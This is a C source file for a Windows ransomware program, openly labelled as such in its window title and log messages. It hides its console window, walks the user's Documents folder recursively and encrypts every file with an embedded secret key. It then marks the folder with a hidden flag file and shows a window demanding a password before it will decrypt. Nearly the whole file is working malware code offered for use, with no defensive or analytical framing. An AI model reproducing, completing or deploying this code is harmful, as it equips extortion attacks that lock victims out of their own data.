#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <stdio.h>
#include <errno.h>
#include <stdbool.h>
#include <string.h>

#include "../include/log.h"
#include "../include/key.h"
#include "../include/file_encipher.h"

typedef enum {
	MALWARE_ENCRYPT,
	MALWARE_DECRYPT
} MALWARE_ACTION;


const char *encryption_file_flag_name = "all_files_enctyped";
char encryption_file_flag[MAX_PATH];
char documents_path[MAX_PATH], documents_path_copy[MAX_PATH];

bool is_an_encrypted_file(const char *file)
{
	char *patter = ".encrypted";
	
	char *ptr_file = (char *) file + strlen(file) - strlen(patter);

	while (*(patter) != 0 && *(patter++) == *(ptr_file++))
		;

	return *patter == 0 && *ptr_file == 0;
}


void nav_files_recursively(char* base_directory, const char* current_directory, MALWARE_ACTION malware_action)
{
	char search_pattern[MAX_PATH];
	snprintf(search_pattern, sizeof(search_pattern), "%s\\*", current_directory);

	WIN32_FIND_DATA find_file_data;
	HANDLE h_find = FindFirstFile(search_pattern, &find_file_data);

	if (h_find == INVALID_HANDLE_VALUE) {
		LOG_ERROR("Error searching for files in directory %s: %s\n", current_directory, strerror(errno));
		return;
	}

	do {
		if (find_file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			// Ignore "." and ".." directories
			if (strcmp(find_file_data.cFileName, ".") != 0
			    && strcmp(find_file_data.cFileName, "..") != 0) {
				LOG("Directory founded: %s\n", find_file_data.cFileName);

				char new_path[MAX_PATH];
				
				memset(new_path, 0, MAX_PATH);
				// Combine paths
				PathCombine(new_path, base_directory, find_file_data.cFileName);
				
				// Continue with the recursive call
				nav_files_recursively(new_path, new_path, malware_action);

				// Remove the added directory when returning from recursion
				PathRemoveFileSpec(new_path);
			}
		} else {
			LOG("File founded: %s\n", find_file_data.cFileName);

			char path[MAX_PATH];
			memset(path, 0, MAX_PATH);
			
			// Combine paths
			PathCombine(path, base_directory, find_file_data.cFileName);

			
			/* Check if it is an encrypted file */
			if (is_an_encrypted_file(find_file_data.cFileName)) {
				if (MALWARE_DECRYPT == malware_action)
					file_decipher(path, secret_key);
			} else {
				if (MALWARE_ENCRYPT == malware_action)
					file_encipher(path, secret_key);
			}
		}
	} while (FindNextFile(h_find, &find_file_data) != 0);

	FindClose(h_find);
}


LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg) {
        case WM_CREATE:
		// Print the text
		CreateWindow("Static", "Put the password to decrypt:", WS_CHILD | WS_VISIBLE,
			     10, 10, 300, 25, hwnd, NULL, NULL, NULL);

		// Print the text box
		CreateWindow("Edit", NULL, WS_CHILD | WS_VISIBLE | WS_BORDER,
			     10, 40, 300, 25, hwnd, (HMENU)1, NULL, NULL);

		// Put the password
		CreateWindow("Button", "Decrypt", WS_CHILD | WS_VISIBLE,
			     10, 70, 80, 25, hwnd, (HMENU)2, NULL, NULL);

		break;
        case WM_COMMAND:
		if (LOWORD(wParam) == 2) {
			// Capture the password
			char buffer[KEY_SIZE];
			
			memset(buffer, 0, KEY_SIZE);
			GetDlgItemText(hwnd, 1, buffer, sizeof(buffer));
			
			LOG("Password to test: %s\n", buffer);
			
			if (strcmp(buffer, secret_key) == 0) {
				/* Decrypt */
				LOG("Password Correct\n");
				CreateWindow("Static", "All files decrypted", WS_CHILD | WS_VISIBLE,
					     10, 100, 300, 25, hwnd, (HMENU)4, NULL, NULL);

				nav_files_recursively(documents_path_copy, documents_path, MALWARE_DECRYPT);

				/* Deleted the flag file */
				DeleteFile(encryption_file_flag);
				
			} else {
				/* Error */

				LOG("Password Incorrect\n");
				CreateWindow("Static", "Password Incorrect", WS_CHILD | WS_VISIBLE,
					     10, 100, 300, 25, hwnd, (HMENU)4, NULL, NULL);
			}
			
		}
		break;
        case WM_DESTROY:
		PostQuitMessage(0);
		break;
        default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}


int run_after_encrypt(void)
{
	// Create a new class of window
	WNDCLASS wc = {0};
	wc.lpfnWndProc = WndProc;
	wc.hInstance = GetModuleHandle(NULL);
	wc.hbrBackground = (HBRUSH)(COLOR_BACKGROUND);
	wc.lpszClassName = "WindowClass";


	if (!RegisterClass(&wc)) {
		MessageBox(NULL, "Error to register a new class of window", "Error", MB_OK | MB_ICONERROR);
		return -1;
	}
	
	// Create the window
	HWND hwnd = CreateWindow("WindowClass", "Ransomware", WS_OVERLAPPEDWINDOW,
				 CW_USEDEFAULT, CW_USEDEFAULT, 400, 150, NULL, NULL,
				 GetModuleHandle(NULL), NULL);


	if (!hwnd) {
		MessageBox(NULL, "Error creating the window", "Error", MB_OK | MB_ICONERROR);
		return 1;
	}

	
	// Show the window
	ShowWindow(hwnd, SW_SHOWNORMAL);

	LOG("Showing the window\n");

	// Start the infite while loop
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}


int main(void)
{

#ifdef NDEBUG
	/* Hide the cosole window window */
	ShowWindow(GetConsoleWindow(), SW_HIDE);
#endif
	
	memset(documents_path, 0, MAX_PATH);
	memset(documents_path_copy, 0, MAX_PATH);
	
	if (!SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PERSONAL, NULL, 0, documents_path))) {
		LOG_ERROR("Documents Folder don't founded!!! :(\n");
		LOG("Finishing the attack.....\n");
		return -1;
	}

	memcpy(documents_path_copy, documents_path, strlen(documents_path));
	
	LOG("Documents Folder: %s \n", documents_path);
	
	memset(encryption_file_flag, 0, MAX_PATH);
	strcat(encryption_file_flag, documents_path);
	strcat(encryption_file_flag, "\\");
	strcat(encryption_file_flag, encryption_file_flag_name);
	
	
	/* Check if the files have been encrypted */
	DWORD attributes = GetFileAttributesA(encryption_file_flag);
	
	if (attributes == INVALID_FILE_ATTRIBUTES) {
		/* Doesn't exist */
		LOG("Lauching the attack.....\n");
		nav_files_recursively(documents_path_copy, documents_path, MALWARE_ENCRYPT);

		/* Created as hidden file */
		HANDLE hFile = CreateFileA(encryption_file_flag, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
					   FILE_ATTRIBUTE_HIDDEN, NULL);
		
		CloseHandle(hFile);
	} else {
		LOG("Attack already lauched...\n");
	}
	
	
	
	return run_after_encrypt();
}


